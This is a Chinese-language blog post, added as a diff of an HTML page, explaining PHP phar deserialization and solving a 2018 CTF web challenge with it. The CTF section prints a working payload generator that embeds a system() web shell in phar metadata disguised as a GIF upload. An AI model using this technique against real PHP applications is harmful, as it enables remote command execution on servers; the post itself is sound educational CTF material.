@@ -1,0 +1,923 @@
+
+
+  
+    
+  
+
+
+  
+
+
+
+
+  
+
+
+  
+
+<!DOCTYPE html>
+<html lang="en-us">
+  <head>
+    
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="generator" content="Hugo 0.38.1 with theme Tranquilpeak 0.4.3-BETA">
+    <title>Phar</title>
+    <meta name="author" content="CLtheorem">
+    <meta name="keywords" content="">
+
+    <link rel="icon" href="/favicon.png">
+    
+
+    
+    <meta name="description" content="php中phar文件反序列化问题。
+    
+    ">
+    <meta property="og:description" content="php中phar文件反序列化问题。
+    
+    ">
+    <meta property="og:type" content="blog">
+    <meta property="og:title" content="Phar">
+    <meta property="og:url" content="/2018/12/phar/">
+    <meta property="og:site_name" content="CLtheorem">
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:title" content="CLtheorem">
+    <meta name="twitter:description" content="php中phar文件反序列化问题。
+    
+    ">
+    
+    
+
+    
+    
+
+    
+      <meta property="og:image" content="//www.gravatar.com/avatar/5450acc316b264c8e7c7b21291faf09a?s=640">
+    
+
+    
+    
+    
+
+    
+
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" integrity="sha256-eZrrJcwDc/3uDhsdt61sL2oOBY362qM3lon1gyExkL0=" crossorigin="anonymous" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.4/jquery.fancybox.min.css" integrity="sha256-vuXZ9LGmmwtjqFX1F+EKin1ThZMub58gKULUyf0qECk=" crossorigin="anonymous" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.4/helpers/jquery.fancybox-thumbs.min.css" integrity="sha256-SEa4XYAHihTcEP1f5gARTB2K26Uk8PsndQYHQC1f4jU=" crossorigin="anonymous" />
+    
+    
+    <link rel="stylesheet" href="/css/style-jsjn0006wyhpyzivf6yceb31gvpjatbcs3qzjvlumobfnugccvobqwxnnaj8.min.css" />
+    
+    
+
+    
+      
+    
+    
+  </head>
+
+  <body>
+
+    <div id="blog">
+      <header id="header" data-behavior="4">
+  <i id="btn-open-sidebar" class="fa fa-lg fa-bars"></i>
+  <div class="header-title">
+    <a class="header-title-link" href="/">CLtheorem</a>
+  </div>
+  
+    
+      <a class="header-right-picture "
+         href="/#about">
+    
+    
+    
+      
+        <img class="header-picture" src="//www.gravatar.com/avatar/5450acc316b264c8e7c7b21291faf09a?s=90" alt="作者的图片" />
+      
+    
+    </a>
+  
+</header>
+
+      <nav id="sidebar" data-behavior="4">
+  <div class="sidebar-container">
+    
+      <div class="sidebar-profile">
+        <a href="/#about">
+          <img class="sidebar-profile-picture" src="//www.gravatar.com/avatar/5450acc316b264c8e7c7b21291faf09a?s=110" alt="作者的图片" />
+        </a>
+        <h4 class="sidebar-profile-name">CLtheorem</h4>
+        
+          <h5 class="sidebar-profile-bio">自强不息，止于至善；敏而好学，致知无央</h5>
+        
+      </div>
+    
+    <ul class="sidebar-buttons">
+      
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="/">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-home"></i>
+      
+      <span class="sidebar-button-desc">首页</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="/categories">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-bookmark"></i>
+      
+      <span class="sidebar-button-desc">分类</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="/tags">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-tags"></i>
+      
+      <span class="sidebar-button-desc">标签</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="/archives">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-archive"></i>
+      
+      <span class="sidebar-button-desc">归档</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="/#about">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-question"></i>
+      
+      <span class="sidebar-button-desc">关于</span>
+    </a>
+  </li>
+
+
+    </ul>
+    <ul class="sidebar-buttons">
+      
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://github.com/CLtheorem">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-github"></i>
+      
+      <span class="sidebar-button-desc">GitHub</span>
+    </a>
+  </li>
+
+
+    </ul>
+    <ul class="sidebar-buttons">
+      
+
+    </ul>
+  </div>
+</nav>
+
+      
+
+      <div id="main" data-behavior="4"
+        class="
+               hasCoverMetaIn
+               ">
+        <article class="post" itemscope itemType="http://schema.org/BlogPosting">
+          
+          
+            <div class="post-header main-content-wrap text-left">
+  
+    <h1 class="post-title" itemprop="headline">
+      Phar
+    </h1>
+  
+  
+  <div class="postShorten-meta post-meta">
+    
+      <time itemprop="datePublished" datetime="2018-12-10T15:37:11&#43;08:00">
+        
+  十二月 10, 2018
+
+      </time>
+    
+    
+  
+  
+    <span>发布在</span>
+    
+      <a class="category-link" href="/categories/php">PHP</a>
+    
+  
+
+  </div>
+
+</div>
+          
+          <div class="post-content markdown" itemprop="articleBody">
+            <div class="main-content-wrap">	
+              <p>php中phar文件反序列化问题。
+    
+    <h1 id="table-of-contents">目录</h1><nav id="TableOfContents">
+<ul>
+<li><a href="#0x00-源起">0x00 源起</a></li>
+<li><a href="#0x01-了解phar文件">0x01 了解phar文件</a></li>
+<li><a href="#0x02-phar反序列化漏洞原理">0x02 phar反序列化漏洞原理</a></li>
+<li><a href="#0x03-ctf例题">0x03 CTF例题</a>
+<ul>
+<li><a href="#柏鹭杯2018-web2-phar">柏鹭杯2018 web2-Phar</a></li>
+</ul></li>
+<li><a href="#0x04-参考链接">0x04 参考链接</a></li>
+</ul>
+</nav></p>
+
+<h1 id="0x00-源起">0x00 源起</h1>
+
+<p>该问题是Sam Thomas在2018.8.9于black hat上分享议题“<a href="https://www.blackhat.com/us-18/briefings/schedule/index.html#its-a-php-unserialization-vulnerability-jim-but-not-as-we-know-it-11078">It&rsquo;s a PHP Unserialization Vulnerability Jim, but Not as We Know It</a>”时提出，为php的反序列化漏洞开辟一方新的“乐土”。</p>
+
+<h1 id="0x01-了解phar文件">0x01 了解phar文件</h1>
+
+<p>phar即PHP Archive，顾名思义，它是php的归档文件，本质为压缩文件。常用于php应用程序的打包，类似于java的.jar文件。</p>
+
+<p>phar有三种归档格式：tar归档、zip归档、phar归档，其中前两种用的较少，主要为phar归档。</p>
+
+<p>phar压缩文件格式由四部分组成:</p>
+
+<ol>
+<li><p>a stub</p>
+
+<p>可以将stub简单地理解为phar文件的文件头。其实质是一个php文件，其最简形式为</p>
+
+<pre><code class="language-php">&lt;?php __HALT_COMPILER(); //闭合符 ?&gt; 可省略。
+</code></pre></li>
+
+<li><p>a manifest describing the contents</p>
+
+<p>manifest部分存储每个被压缩文件的文件名长度、文件名、压缩前大小等一系列信息，具体清单如下：
+<img src="/post/images/phar_2.jpg" alt="image2" /></p>
+
+<p>注意清单中的最后一条，Metadata是以序列化的形式存储的，这里便是phar反序列问题的根源所在。</p></li>
+
+<li><p>the file contents</p>
+
+<p>很直白，就是压缩文件的内容。</p></li>
+
+<li><p>[optional] a signature for verifying phar integrity</p>
+
+<p>一串用于校验phar文件完整性的hash值，支持md5和sha1两种hash类型。这里hash值虽说是optional，但实际pahr文件似乎总是有添加的（没有详做考证）？php生成phar文件时也会自动添加。</p></li>
+</ol>
+
+<h1 id="0x02-phar反序列化漏洞原理">0x02 phar反序列化漏洞原理</h1>
+
+<p>前面提到在phar文件的manifest中，Metadata是以序列化形式存储的。配合phar://伪协议读取phar文件时，Metadata被反序列化，之后便可接上我们所熟悉的serialize-unseialize型反序列化漏洞。</p>
+
+<p>需要注意的问题是，在phar反序列化漏洞中，只有<code>__destruct</code>和<code>__wakeup</code>会被触发。</p>
+
+<p>一个小的演示：
+
+  
+    
+  
+  
+    
+  
+  
+  
+
+
+<figure class="highlight php language-php">
+  <figcaption>
+    
+      <span>makePharfile.php</span>
+    
+  </figcaption>
+  <table>
+    <tbody>
+      <tr>
+        <td class="gutter">
+          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre>
+        </td>
+        <td class="code">
+          <pre class="code-highlight language-php"><code class="php">&lt;?php
+	class Test{
+		function __wakeup(){
+			echo &#34;wakeup now.\n&#34;;
+		}
+
+		function __destruct(){
+			echo &#34;destruct now.\n&#34;;
+		}
+	}
+	//Phar类提供对phar文件的相关操作
+	//php默认只支持phar文件的读取，需要修改php.ini中phar.readonly值为0，以开启写功能。
+	//注意对于同名phar文件的写操作，php是进行内容的追加，而非覆盖，重复测试时记得先unlink()
+	$phar = new Phar(&#34;test.phar&#34;);
+	$phar-&gt;setStub(&#34;&lt;?php __HALT_COMPILER(); ?&gt;&#34;); 
+	$metadata = new Test();
+	$phar-&gt;setMetadata($metadata);
+	//以字符串的形式添加一个文件到 phar 文件
+	$phar-&gt;addFromString(&#39;test.txt&#39;, &#39;Hello world!&#39;);
+?&gt;</code></pre>
+        </td>
+      </tr>
+    </tbody>
+  </table>
+</figure></p>
+
+<p>生成phar文件如下：
+<img src="/post/images/phar_1.jpg" alt="image1" /></p>
+
+<p>之后进行读取
+
+  
+    
+  
+  
+    
+  
+  
+  
+
+
+<figure class="highlight php language-php">
+  <figcaption>
+    
+      <span>read.php</span>
+    
+  </figcaption>
+  <table>
+    <tbody>
+      <tr>
+        <td class="gutter">
+          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre>
+        </td>
+        <td class="code">
+          <pre class="code-highlight language-php"><code class="php">&lt;?php
+	class Test{
+		function __wakeup(){
+			echo &#34;wakeup now.\n&#34;;
+		}
+
+		function __destruct(){
+			echo &#34;destruct now.\n&#34;;
+		}
+	}
+
+	file_exists(&#34;phar://test.phar/test.txt&#34;);
+	//some other functions such as file_get_contents(), is_dir() are also ok. 
+?&gt;</code></pre>
+        </td>
+      </tr>
+    </tbody>
+  </table>
+</figure></p>
+
+<p>结果正是我们所想看到的：
+<img src="/post/images/phar_3.jpg" alt="image1" /></p>
+
+<h1 id="0x03-ctf例题">0x03 CTF例题</h1>
+
+<h2 id="柏鹭杯2018-web2-phar">柏鹭杯2018 web2-Phar</h2>
+
+
+  
+    
+  
+  
+    
+  
+  
+  
+
+
+<figure class="highlight php language-php">
+  <figcaption>
+    
+      <span>web2.php</span>
+    
+  </figcaption>
+  <table>
+    <tbody>
+      <tr>
+        <td class="gutter">
+          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre>
+        </td>
+        <td class="code">
+          <pre class="code-highlight language-php"><code class="php">&lt;?php
+	if(isset($_GET[&#39;filename&#39;])){
+	$filename=$_GET[&#39;filename&#39;];
+	class MyClass{
+	    var $output = &#39;echo &#34;hahaha&#34;;&#39;;
+	    function __destruct()
+	    {
+	        eval($this -&gt; output);
+	    }
+	}
+	file_exists($filename);
+	}
+	else{
+	highlight_file(__FILE__);
+?&gt;</code></pre>
+        </td>
+      </tr>
+    </tbody>
+  </table>
+</figure>
+
+<p>该题另有一处文件上传点，只允许上传gif图片，但并未对图片内容进行校验，上传后可得到图片存储路径。</p>
+
+<p>利用如下代码生成一个后门文件temp.phar：
+
+  
+    
+  
+  
+    
+  
+  
+  
+
+
+<figure class="highlight php language-php">
+  <figcaption>
+    
+      <span>backdoor.php</span>
+    
+  </figcaption>
+  <table>
+    <tbody>
+      <tr>
+        <td class="gutter">
+          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre>
+        </td>
+        <td class="code">
+          <pre class="code-highlight language-php"><code class="php">&lt;?php
+	class MyClass{
+		var $output = &#39;@eval(system($_GET[&#34;key&#34;]));&#39;;
+	}
+	$payload = new MyClass();
+	unlink(&#34;temp.phar&#34;);
+	$phar = new Phar(&#34;temp.phar&#34;);
+	$phar-&gt;setStub(&#34;&lt;?php __HALT_COMPILER(); ?&gt;&#34;); 
+	$phar-&gt;setMetadata($payload);
+	$phar-&gt;addFromString(&#39;test.txt&#39;, &#39;Hello world!&#39;);
+?&gt;</code></pre>
+        </td>
+      </tr>
+    </tbody>
+  </table>
+</figure>
+把文件后缀改为gif并上传，然后带上参数key访问即可。下面是本地环境测试结果：
+<img src="/post/images/phar_4.jpg" alt="image4" /></p>
+
+<h1 id="0x04-参考链接">0x04 参考链接</h1>
+
+<ol>
+<li><a href="https://findneo.github.io/181125-bailucup-writeup/">https://findneo.github.io/181125-bailucup-writeup/</a></li>
+<li><a href="https://paper.seebug.org/680/">https://paper.seebug.org/680/</a></li>
+<li><a href="https://www.blackhat.com/us-18/briefings/schedule/index.html#its-a-php-unserialization-vulnerability-jim-but-not-as-we-know-it-11078">https://www.blackhat.com/us-18/briefings/schedule/index.html#its-a-php-unserialization-vulnerability-jim-but-not-as-we-know-it-11078</a></li>
+</ol>
+              
+            </div>
+          </div>
+          <div id="post-footer" class="post-footer main-content-wrap">
+            
+              
+            
+            
+  <div class="post-actions-wrap">
+      <nav >
+        <ul class="post-actions post-action-nav">
+          
+            <li class="post-action">
+              
+                <a class="post-action-btn btn btn--disabled">
+              
+                  <i class="fa fa-angle-left"></i>
+                  <span class="hide-xs hide-sm text-small icon-ml">下一篇</span>
+                </a>
+            </li>
+            <li class="post-action">
+              
+                <a class="post-action-btn btn btn--default tooltip--top" href="/2018/11/insert-into/" data-tooltip="Insert into">
+              
+                  <span class="hide-xs hide-sm text-small icon-mr">上一篇</span>
+                  <i class="fa fa-angle-right"></i>
+                </a>
+            </li>
+          
+        </ul>
+      </nav>
+    <ul class="post-actions post-action-share" >
+      
+        <li class="post-action hide-lg hide-md hide-sm">
+          <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions">
+            <i class="fa fa-share-alt"></i>
+          </a>
+        </li>
+        
+      
+      
+        <li class="post-action">
+          <a class="post-action-btn btn btn--default" href="#disqus_thread">
+            <i class="fa fa-comment-o"></i>
+          </a>
+        </li>
+      
+      <li class="post-action">
+        
+          <a class="post-action-btn btn btn--default" href="#table-of-contents">
+        
+          <i class="fa fa-list"></i>
+        </a>
+      </li>
+    </ul>
+  </div>
+
+
+            
+              
+                <div id="disqus_thread">
+  <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+              
+            
+          </div>
+        </article>
+        <footer id="footer" class="main-content-wrap">
+  <span class="copyrights">
+    &copy; 2018 CLtheorem. All Rights Reserved
+  </span>
+</footer>
+
+      </div>
+      <div id="bottom-bar" class="post-bottom-bar" data-behavior="4">
+        
+  <div class="post-actions-wrap">
+      <nav >
+        <ul class="post-actions post-action-nav">
+          
+            <li class="post-action">
+              
+                <a class="post-action-btn btn btn--disabled">
+              
+                  <i class="fa fa-angle-left"></i>
+                  <span class="hide-xs hide-sm text-small icon-ml">下一篇</span>
+                </a>
+            </li>
+            <li class="post-action">
+              
+                <a class="post-action-btn btn btn--default tooltip--top" href="/2018/11/insert-into/" data-tooltip="Insert into">
+              
+                  <span class="hide-xs hide-sm text-small icon-mr">上一篇</span>
+                  <i class="fa fa-angle-right"></i>
+                </a>
+            </li>
+          
+        </ul>
+      </nav>
+    <ul class="post-actions post-action-share" >
+      
+        <li class="post-action hide-lg hide-md hide-sm">
+          <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions">
+            <i class="fa fa-share-alt"></i>
+          </a>
+        </li>
+        
+      
+      
+        <li class="post-action">
+          <a class="post-action-btn btn btn--default" href="#disqus_thread">
+            <i class="fa fa-comment-o"></i>
+          </a>
+        </li>
+      
+      <li class="post-action">
+        
+          <a class="post-action-btn btn btn--default" href="#table-of-contents">
+        
+          <i class="fa fa-list"></i>
+        </a>
+      </li>
+    </ul>
+  </div>
+
+
+      </div>
+      <div id="share-options-bar" class="share-options-bar" data-behavior="4">
+  <i id="btn-close-shareoptions" class="fa fa-close"></i>
+  <ul class="share-options">
+    
+  </ul>
+</div>
+<div id="share-options-mask" class="share-options-mask"></div>
+    </div>
+    
+    <div id="about">
+  <div id="about-card">
+    <div id="about-btn-close">
+      <i class="fa fa-remove"></i>
+    </div>
+    
+      <img id="about-card-picture" src="//www.gravatar.com/avatar/5450acc316b264c8e7c7b21291faf09a?s=110" alt="作者的图片" />
+    
+    <h4 id="about-card-name">CLtheorem</h4>
+    
+      <div id="about-card-bio">自强不息，止于至善；敏而好学，致知无央</div>
+    
+    
+    
+      <div id="about-card-location">
+        <i class="fa fa-map-marker"></i>
+        <br/>
+        China
+      </div>
+    
+  </div>
+</div>
+
+    <div id="algolia-search-modal" class="modal-container">
+  <div class="modal">
+    <div class="modal-header">
+      <span class="close-button"><i class="fa fa-close"></i></span>
+      <a href="https://algolia.com" target="_blank" rel="noopener" class="searchby-algolia text-color-light link-unstyled">
+        <span class="searchby-algolia-text text-color-light text-small">by</span>
+        <img class="searchby-algolia-logo" src="https://www.algolia.com/static_assets/images/press/downloads/algolia-light.svg">
+      </a>
+      <i class="search-icon fa fa-search"></i>
+      <form id="algolia-search-form">
+        <input type="text" id="algolia-search-input" name="search"
+          class="form-control input--large search-input" placeholder="搜索" />
+      </form>
+    </div>
+    <div class="modal-body">
+      <div class="no-result text-color-light text-center"></div>
+      <div class="results">
+        
+        
+          <div class="media">
+            
+            <div class="media-body">
+              <a class="link-unstyled" href="/2018/12/phar/">
+                <h3 class="media-heading">Phar</h3>
+              </a>
+              <span class="media-meta">
+                <span class="media-date text-small">
+                  Dec 12, 2018
+                </span>
+              </span>
+              <div class="media-content hide-xs font-merryweather"><p>php中phar文件反序列化问题。
+    
+    <!-- toc --></p></div>
+            </div>
+            <div style="clear:both;"></div>
+            <hr>
+          </div>
+        
+          <div class="media">
+            
+            <div class="media-body">
+              <a class="link-unstyled" href="/2018/11/insert-into/">
+                <h3 class="media-heading">Insert into</h3>
+              </a>
+              <span class="media-meta">
+                <span class="media-date text-small">
+                  Nov 11, 2018
+                </span>
+              </span>
+              <div class="media-content hide-xs font-merryweather"><p>INSERT INTO函数基于时间的盲注
+    </p></div>
+            </div>
+            <div style="clear:both;"></div>
+            <hr>
+          </div>
+        
+          <div class="media">
+            
+            <div class="media-body">
+              <a class="link-unstyled" href="/2018/11/regular_expression/">
+                <h3 class="media-heading">Regular_expression</h3>
+              </a>
+              <span class="media-meta">
+                <span class="media-date text-small">
+                  Nov 11, 2018
+                </span>
+              </span>
+              <div class="media-content hide-xs font-merryweather"><p></p></div>
+            </div>
+            <div style="clear:both;"></div>
+            <hr>
+          </div>
+        
+          <div class="media">
+            
+            <div class="media-body">
+              <a class="link-unstyled" href="/2018/11/hitcon2018-lostkey/">
+                <h3 class="media-heading">Hitcon2018-Lostkey</h3>
+              </a>
+              <span class="media-meta">
+                <span class="media-date text-small">
+                  Nov 11, 2018
+                </span>
+              </span>
+              <div class="media-content hide-xs font-merryweather"><p>Hitcon2018中lost key的wp。
+    </p></div>
+            </div>
+            <div style="clear:both;"></div>
+            <hr>
+          </div>
+        
+          <div class="media">
+            
+            <div class="media-body">
+              <a class="link-unstyled" href="/2018/10/base64%E9%9A%90%E5%86%99/">
+                <h3 class="media-heading">Base64隐写</h3>
+              </a>
+              <span class="media-meta">
+                <span class="media-date text-small">
+                  Oct 10, 2018
+                </span>
+              </span>
+              <div class="media-content hide-xs font-merryweather"></div>
+            </div>
+            <div style="clear:both;"></div>
+            <hr>
+          </div>
+        
+          <div class="media">
+            
+            <div class="media-body">
+              <a class="link-unstyled" href="/2018/10/pwntools/">
+                <h3 class="media-heading">Pwntools</h3>
+              </a>
+              <span class="media-meta">
+                <span class="media-date text-small">
+                  Oct 10, 2018
+                </span>
+              </span>
+              <div class="media-content hide-xs font-merryweather"><p>官方文档：<a href="http://docs.pwntools.com">http://docs.pwntools.com</a>
+    </p></div>
+            </div>
+            <div style="clear:both;"></div>
+            <hr>
+          </div>
+        
+          <div class="media">
+            
+            <div class="media-body">
+              <a class="link-unstyled" href="/2018/09/writeup-simple-injection/">
+                <h3 class="media-heading">Writeup Simple Injection</h3>
+              </a>
+              <span class="media-meta">
+                <span class="media-date text-small">
+                  Sep 9, 2018
+                </span>
+              </span>
+              <div class="media-content hide-xs font-merryweather"><p>Jarvis OJ中web题——Simple Injection
+    </p></div>
+            </div>
+            <div style="clear:both;"></div>
+            <hr>
+          </div>
+        
+          <div class="media">
+            
+            <div class="media-body">
+              <a class="link-unstyled" href="/2018/09/%E7%94%A8photoshop%E8%A7%A3%E5%86%B3%E7%9A%84%E4%B8%A4%E9%81%93misc/">
+                <h3 class="media-heading">用photoshop解决的两道misc</h3>
+              </a>
+              <span class="media-meta">
+                <span class="media-date text-small">
+                  Sep 9, 2018
+                </span>
+              </span>
+              <div class="media-content hide-xs font-merryweather"><p>这是IceCTF2018中的两道misc，感觉用Photoshop处理起来很好玩。
+    </p></div>
+            </div>
+            <div style="clear:both;"></div>
+            <hr>
+          </div>
+        
+          <div class="media">
+            
+            <div class="media-body">
+              <a class="link-unstyled" href="/2018/08/basic-xss/">
+                <h3 class="media-heading">Basic XSS</h3>
+              </a>
+              <span class="media-meta">
+                <span class="media-date text-small">
+                  Aug 8, 2018
+                </span>
+              </span>
+              <div class="media-content hide-xs font-merryweather"><p>XSS Challenges Stage(<a href="http://xss-quiz.int21h.jp">http://xss-quiz.int21h.jp</a>) 上的练习题解。
+    </p></div>
+            </div>
+            <div style="clear:both;"></div>
+            <hr>
+          </div>
+        
+          <div class="media">
+            
+            <div class="media-body">
+              <a class="link-unstyled" href="/2018/04/basic-sql-injection-1/">
+                <h3 class="media-heading">Basic Sql Injection 1</h3>
+              </a>
+              <span class="media-meta">
+                <span class="media-date text-small">
+                  Apr 4, 2018
+                </span>
+              </span>
+              <div class="media-content hide-xs font-merryweather"><p>基础的MySQL(MariaDB)数据库注入知识（一）
+    </p></div>
+            </div>
+            <div style="clear:both;"></div>
+            <hr>
+          </div>
+        
+      </div>
+    </div>
+    <div class="modal-footer">
+      <p class="results-count text-medium"
+         data-message-zero=""
+         data-message-one=""
+         data-message-other="">
+         13 posts found
+      </p>
+    </div>
+  </div>
+</div>
+    
+  
+    
+    <div id="cover" style="background-image:url('/images/54547023_p10.png');"></div>
+  
+
+
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js" integrity="sha256-BbhdlvQf/xTY9gja0Dq3HiwQF8LaCRTXxZKRutelT44=" crossorigin="anonymous"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js" integrity="sha256-/BfiIkHlHoVihZdc6TFuj7MmJ0TWcWsMXkeDFwhi0zw=" crossorigin="anonymous"></script>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.7/js/jquery.fancybox.min.js" integrity="sha256-GEAnjcTqVP+vBp3SSc8bEDQqvWAZMiHyUSIorrWwH50=" crossorigin="anonymous"></script>
+
+
+<script src="/js/script-qi9wbxp2ya2j6p7wx1i6tgavftewndznf4v0hy2gvivk1rxgc3lm7njqb6bz.min.js"></script>
+
+
+
+<script>
+$(document).ready(function() {
+  hljs.configure({ classPrefix: '', useBR: false });
+  $('pre.code-highlight > code, pre > code').each(function(i, block) {
+    if (!$(this).hasClass('codeblock')) {
+      $(this).addClass('codeblock');
+    }
+    hljs.highlightBlock(block);
+  });
+});
+</script>
+
+
+  
+    
+      <script>
+        var disqus_config = function () {
+          this.page.url = '\/2018\/12\/phar\/';
+          
+            this.page.identifier = '\/2018\/12\/phar\/'
+          
+        };
+        (function() {
+          
+          
+          if (window.location.hostname == "localhost") {
+            return;
+          }
+          var d = document, s = d.createElement('script');
+          var disqus_shortname = 'peak';
+          s.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+
+          s.setAttribute('data-timestamp', +new Date());
+          (d.head || d.body).appendChild(s);
+        })();
+      </script>
+    
+  
+
+
+
+    
+  </body>
+</html>
+
